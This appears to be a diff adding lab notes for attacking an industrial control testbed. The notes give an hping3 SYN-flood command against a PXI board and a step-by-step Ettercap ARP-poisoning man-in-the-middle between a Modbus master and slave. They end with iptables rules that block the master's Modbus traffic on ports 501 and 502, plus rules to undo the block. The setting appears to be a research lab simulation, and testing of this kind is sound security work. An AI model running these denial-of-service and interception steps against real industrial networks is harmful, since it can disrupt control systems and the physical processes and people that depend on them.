@@ -1,0 +1,66 @@
+1. Command to trigger a SYN flood attack towards PXI
+
+sudo hping3 -c 10000 -d 1500 -S -w 64 -p 501 --flood --rand-source 11.11.11.2 
+c- packet count size
+-d - packet size
+-S - SYN packets only.
+-w - TCP window size
+-p - port on target
+-flood - try to flood the target as fast as possible.
+-rand-source - random source ip for the tcp SYN packets
+11.11.11.2 - the targe board ip.
+
+
+
+
+IpTable Rules to Block Modbus
+=====================================
+But before blocking the Modbus traffic, we need to carry out a 1 way MITM attack. Please note that we cannot carry out a full 2-way MITM
+attack because of our server limitation of having 1 ethernet port.
+
+So we place our MITM machine in between the direction from Master 
+to Slave.
+The traffic flow is as below.
+
+Master--->MITM--->PXI(Modbus Slave)
+Master<--------PXI(Modbus Slave)
+
+sudo sysctl -p /etc/sysctl.conf
+
+Start Ettercap
+---------------
+Please configure your ethernet interface to be in the same network 
+as the network of the Modbus slave.
+
+sudo ettercap -G
+Start unified sniffing.
+Scan for hosts on the network.
+Following hosts show up.
+
+11.11.11.1 - Router interace in SITL of OPNET to
+wards PXI(Slave).
+11.11.11.2- Modbus slave
+11.11.11.3 - The Windows ethernet interface IP ( not relevant).
+Select target1 as 11.11.11.1 and target 2 as 11.11.11.2.
+Start the ARP poisoining with 1 way poisoining attack.
+
+Start wireshark and see that you should be receiving Modbus
+packets from 10.10.10.1(Modbus master ) to 11.11.11.2(Modbus slave).
+
+If you can see the packets then the MITM setup is successful.
+
+Now you can block all the modbus traffic by below iptables rules.
+The rules can be made more specific to drop the Modbus traffic
+from the original master.
+
+To block all the Modbus Traffic
+--------------------------------
+sudo iptables -A OUTPUT -s 10.10.10.1 -p tcp --dport 501 -j DROP;sudo iptables -A OUTPUT -s 10.10.10.1 -p tcp --dport 502 -j DROP
+sudo iptables -A OUTPUT -s 10.10.10.1 -p tcp --dport 502 -j DROP
+
+To unblock all the Modbus Traffic
+--------------------------------
+sudo iptables -D OUTPUT -s 10.10.10.1 -p tcp --dport 501 -j DROP
+sudo iptables -D OUTPUT -s 10.10.10.1 -p tcp --dport 502 -j DROP
+
+
